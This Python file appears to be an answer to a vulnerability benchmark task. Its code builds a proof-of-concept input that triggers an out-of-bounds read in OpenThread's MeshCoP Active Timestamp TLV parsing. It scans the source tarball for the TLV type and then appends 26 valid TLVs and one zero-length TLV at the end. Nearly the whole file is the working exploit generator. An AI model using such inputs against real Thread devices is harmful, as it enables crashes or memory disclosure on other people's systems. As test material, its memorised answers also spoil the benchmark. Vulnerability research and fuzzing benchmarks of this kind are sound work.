import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        active_ts_type = self._detect_tlv_type(src_path, ["kActiveTimestamp", "ActiveTimestamp"])
        if active_ts_type is None:
            # Fallback to common MeshCoP Active Timestamp TLV type used by OpenThread
            active_ts_type = 0x0E  # 14

        # Build dataset bytes:
        #  - 26 valid Active Timestamp TLVs (each: type, length=8, 8 bytes value) -> 26 * 10 = 260 bytes
        #  - 1 invalid Active Timestamp TLV at the end with length=0 -> 2 bytes
        # Total = 262 bytes
        payload = bytearray()
        for _ in range(26):
            payload.append(active_ts_type & 0xFF)
            payload.append(8)  # required min length is 8; provide correct length for these
            payload += b"\x00" * 8
        # Final TLV is invalid: length too short (0), placed at the end to force OOB read in vulnerable code
        payload.append(active_ts_type & 0xFF)
        payload.append(0)

        return bytes(payload)

    def _detect_tlv_type(self, tar_path, keys):
        """
        Attempt to detect TLV type values by scanning source headers in the provided tarball.

        Args:
            tar_path: Path to the source tarball.
            keys: List of identifier names to search for (e.g., ["kActiveTimestamp", "ActiveTimestamp"]).

        Returns:
            int or None: The detected TLV type integer, or None if not found.
        """
        patterns = []
        for key in keys:
            # Patterns to match C++ enum assignments of the form:
            #   kActiveTimestamp = 14,
            #   ActiveTimestamp = 0x0e,
            #   Tlv::kActiveTimestamp = 0x0e,
            patterns.extend([
                rf'{re.escape(key)}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                rf'k{re.escape(key)}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                rf'Type::k{re.escape(key)}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
                rf'Tlv::k{re.escape(key)}\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
            ])

        try:
            with tarfile.open(tar_path, 'r:*') as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name.lower()
                    # Only scan likely code files for speed
                    if not (name.endswith('.hpp') or name.endswith('.hh') or name.endswith('.h')
                            or name.endswith('.cc') or name.endswith('.cpp') or name.endswith('.c')):
                        continue
                    try:
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        content = f.read().decode('utf-8', errors='ignore')
                    except Exception:
                        continue

                    for pat in patterns:
                        for m in re.finditer(pat, content):
                            val_str = m.group(1)
                            try:
                                val = int(val_str, 0)
                                if 0 <= val <= 255:
                                    return val
                            except Exception:
                                continue
        except Exception:
            pass

        return None